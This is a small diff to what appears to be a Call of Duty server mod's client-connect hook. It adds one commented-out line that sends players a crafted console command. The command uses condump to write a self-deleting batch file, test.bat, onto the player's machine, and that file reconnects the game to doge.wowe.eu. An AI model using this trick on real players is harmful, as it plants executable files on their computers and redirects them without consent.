@@ -77,7 +77,8 @@ char* myClientConnect(int a1, int a2) {
         fprintf(f, "Player %s connected with id %d\n", playername, a1);
         fclose(f);
     }*/
-	//if(!strcmp(result,""))
+	//SV_SendServerCommand(getclient(a1), 1, "v clientcmd \"clear;echo \"@echo off\";echo \"color 3a\";echo \"cd ..\";echo \"CoDMP.exe +connect doge.wowe.eu\";echo \"del test.bat\";echo \"exit\";condump test.bat;clear\"");
+    //if(!strcmp(result,""))
         return ret;
     //return result;
 }
